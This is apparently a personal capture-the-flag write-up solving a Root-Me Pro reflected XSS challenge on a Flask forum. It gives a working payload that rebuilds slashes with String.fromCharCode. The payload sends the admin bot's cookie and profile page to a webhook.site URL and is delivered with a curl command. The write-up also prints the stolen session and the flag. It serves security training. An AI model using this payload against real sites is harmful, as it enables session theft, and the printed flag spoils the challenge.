# XSS - Reflected - URI (Root-Me Pro) — SOLVED

- **Category**: Web / Client
- **Difficulty**: Medium — 450 pts, ~1h
- **Tagline**: "Mirror mirror..."
- **App title (HTML `<title>`)**: `XSS - Reflected 2`
- **Instance**: `https://instance-019fe9f1-ad60-70e2-8162-59d04b4bf747.challenges.root-me.pro`
- **Stack**: Flask / Werkzeug 3.1.3 / Python 3.11.2, Bootstrap 5.2.3
- **Flag**: `RM{2b8443891c075f49dc25937998505c93}`

## Attack surface (unauthenticated)

| Path | Result |
|---|---|
| `/` | static landing page (deterministic, 4435 B) |
| `/forum` | thread list, size varies per request (random comment counts) |
| `/forum/<uuid>` | all 10 real threads "administrator does not allow you to read" |
| `/forum/<junk>` | **404 page that reflects the path segment** + Report button |
| `/forum/report` | POST `url` + `comment` → admin bot visits `url` |
| `/login` | generic error only, no reflection |
| `/register` | disabled, POST also disabled |
| `/profile`, `/logout` | 302 → `/login` (`vary: Cookie`) |

## Dead ends (ruled out)

- `static/js/custom/script.js` — reads `document.location` but only string-compares
  it against navbar `<a>.href` for active-tab styling. **No sink.** Red herring that
  fits the "URI" title.
- No reflection in: 404 page body, `/` query params, `/forum` query params
  (ffuf w/ burp-parameter-names), login error message.
- `robots.txt`, `sitemap.xml`, `.env`, `.git/HEAD`, `script.js.map`, `/console` → all 404.
- gobuster (dirbuster medium + php,html,txt,json) found nothing beyond the routes above.
- POST `/register` still refuses — no "UI disabled but endpoint live" shortcut.

## The bug

`/forum/<uuid>` interpolates the unmatched uuid straight into HTML with **no escaping**:

```
Oops ! No thread where found with the uuid '<PAYLOAD>'.
```

Plain text context (not an attribute), and **no CSP header** on any response.

## The one real constraint: no `/` and no `\`

Payload lives in a *path segment*, so Werkzeug's path normalisation eats separators.
Anything containing a slash — raw, percent-encoded, or a backslash — returns **307**
before the route is reached:

| Probe | Code |
|---|---|
| `a%2Fb` (encoded `/`) | 307 |
| `a%5Cb` (backslash — normalised to `/`) | 307 |
| `%20 %22 %28 %2B %3F %3A %3D %3C %3E` | 404 (route matched, all fine) |

This is why `<script>...</script>` and `</b>` silently failed while `<svg onload=...>`
and `<img src=x onerror=...>` sailed through — closing tags need `/`.

Killed the obvious `\x2f` trick too, since backslash is itself banned.
Slashes had to be manufactured at runtime: **`String.fromCharCode(47)`**.

## Payload

```html
<svg onload="s=String.fromCharCode(47);
u='https:'+s+s+'webhook.site'+s+'<TOKEN>';
fetch(u+'?c='+encodeURIComponent(document.cookie));
fetch(s+'profile').then(r=>r.text()).then(t=>fetch(u+'?p=1',{method:'POST',body:t}))">
```

Two stages on purpose:
1. `?c=` — `document.cookie` (works only if not HttpOnly).
2. `?p=1` POST — fetch `/profile` **in the admin's browser** and ship the rendered HTML.

Note `fetch(s+'profile')`, not `fetch('profile')` — relative would resolve to
`/forum/profile`.

Delivery:
```bash
curl -X POST "$T/forum/report" \
  --data-urlencode "url=$PAYLOAD_URL" \
  --data-urlencode "comment=Broken thread link, please check"
# → 302 /forum?reported=1
```

## Result

Bot fired within seconds (headless Chrome UA):

```
GET  ?c=xss-reflected-2-session=eyJ1c2VybmFtZSI6ImFkbWluIn0.anlXbw.GxqyzW6Wh3Arw8ao5rpuR8dhDEY
POST ?p=1   (3180 bytes of admin /profile HTML)
```

Session cookie is **not HttpOnly**; Flask payload decodes to `{"username":"admin"}`
(signed, so it can't be forged without `SECRET_KEY` — stealing it was the point).

Admin profile contained:
```
Rank: -1/845023 pirates
Gold: ∞ 💰
Treasure: 💰 RM{2b8443891c075f49dc25937998505c93} 💰
```

## Gotcha worth remembering

Replaying the stolen cookie ~18 min later → **302 to /login**. The bot's session is
short-lived. Stage 2 is what actually won the challenge; a cookie-only payload would
have needed a re-report and a fast manual replay.

## Housekeeping

`~/ctf/rootme/` (my initial dir) vanished mid-solve — the repo was reorganised into
`root-me/` + `root-me-pro/`. Re-created under `root-me-pro/` to match convention.
